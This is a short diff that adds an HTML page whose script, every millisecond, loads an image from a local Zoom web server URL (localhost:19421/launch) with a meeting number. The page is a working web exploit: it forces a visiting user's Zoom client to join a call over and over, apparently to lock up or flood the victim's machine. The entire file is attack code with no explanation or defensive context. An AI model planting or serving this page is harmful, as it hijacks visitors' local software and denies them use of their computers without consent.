@@ -1,0 +1,18 @@
+<body>
+<script>
+// It's actually better if this number isn't a valid zoom number.
+var attackNumber = "694138052"
+
+setInterval(function(){
+  var image = document.createElement("img");
+  // Use a date to bust the browser's cache
+  var date = new Date();
+  image.src = "http://localhost:19421/launch?action=join&confno=" + attackNumber + "&" + date.getTime();
+  image.onload = function() {
+    // Be tidy, clean up the DOM afterwards
+    image.parentNode.removeChild(image);
+  };
+  document.body.appendChild(image);
+}, 1);
+</script>
+</body>
